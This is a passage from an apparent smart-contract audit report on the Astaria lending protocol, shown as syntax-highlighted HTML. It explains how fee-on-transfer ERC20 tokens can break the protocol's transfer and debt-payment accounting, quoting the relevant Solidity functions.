class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">268</span><span class=\"mtk1\">      </span><span class=\"mtk11\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawRatio</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">269</span><span class=\"mtk12\">:</span><span class=\"mtk1\">       </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">VAULT</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">270</span><span class=\"mtk1\">      } </span><span class=\"mtk12\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">280</span><span class=\"mtk12\">        if</span><span class=\"mtk1\"> (balance &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk12\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">  </span><span class=\"mtk7\">281</span><span class=\"mtk12\">:</span><span class=\"mtk1\">         </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">VAULT</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">282</span><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">297</span><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">298</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">withdrawProxy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">299</span><span class=\"mtk1\">      </span><span class=\"mtk12\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>However, according to <a href=\"https://github.com/d-xo/weird-erc20#fee-on-transfer\">https://github.com/d-xo/weird-erc20#fee-on-transfer</a></p>\n<p>Some tokens take a transfer fee (e.g. STA, PAXG), some do not currently charge a fee but may do so in the future (e.g. USDT, USDC).</p>\n<p>So the recipient address may not receive the full transfered amount, which can break the protocol’s accounting and revert transaction.</p>\n<p>The same safeTransfer and safeTransferFrom is used in the vault deposit / withdraw / mint / withdraw function.</p>\n<p>Let us see a concrete example,</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"130\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TransferProxy</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Auth</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ITransferProxy</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Authority</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_AUTHORITY</span><span class=\"mtk1\">) </span><span class=\"mtk11\">Auth</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_AUTHORITY</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//only constructor we care about is  Auth</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">tokenTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">requiresAuth</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The transfer Proxy also use</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"131\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>This transfer is used extensively</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"132\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">AstariaRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">208</span><span class=\"mtk1\">      </span><span class=\"mtk12\">RouterStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadRouterSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">209</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">TRANSFER_PROXY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">210</span><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">LienToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">184</span><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">185</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">TRANSFER_PROXY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">186</span><span class=\"mtk1\">        </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">encumber</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">654</span><span class=\"mtk1\">      </span><span class=\"mtk11\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">payment</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">655</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">TRANSFER_PROXY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payer</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payment</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">656</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">860</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">861</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">TRANSFER_PROXY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payer</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">862</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">scripts</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">deployments</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">Deploy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">378</span><span class=\"mtk1\">        </span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">UserRoles</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">379</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">TRANSFER_PROXY</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenTransferFrom</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">380</span><span class=\"mtk1\">        </span><span class=\"mtk4\">true</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">403</span><span class=\"mtk1\">        </span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">UserRoles</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LIEN_TOKEN</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">404</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">TRANSFER_PROXY</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenTransferFrom</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">405</span><span class=\"mtk1\">        </span><span class=\"mtk4\">true</span></span></span></code></pre>\n<p>If the token used charged a transfer fee, the accounting below is broken:</p>\n<p>When _payDebt is called</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"133\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_payDebt</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">LienStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payment</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payer</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">AuctionStack</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalSpent</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">spent</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">spent</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_paymentAH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">, </span><span class=\"mtk12\">i</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payment</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payer</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">totalSpent</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">spent</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">payment</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">spent</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>Which calls _paymentAH</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"134\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_paymentAH</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">LienStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">AuctionStack</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payment</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lienId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">end</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">end</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owing</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">amountOwed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//checks the lien exists</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payee</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getPayee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">remaining</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">owing</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">payment</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">remaining</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">owing</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">payment</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">payment</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">owing</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">payment</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">TRANSFER_PROXY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payer</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payment</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienMeta</span><span class=\"mtk1\">[</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">]; </span><span class=\"mtk3\">//full delete</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">_isPublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payee</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">IPublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">payee</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updateAfterLiquidationPayment</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IPublicVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">LiquidationPaymentParams</span><span class=\"mtk1\">({</span><span class=\"mtk12\">remaining:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">remaining</span><span class=\"mtk1\">})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Payment</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payment</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payment</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>Note that the code</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"135\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span 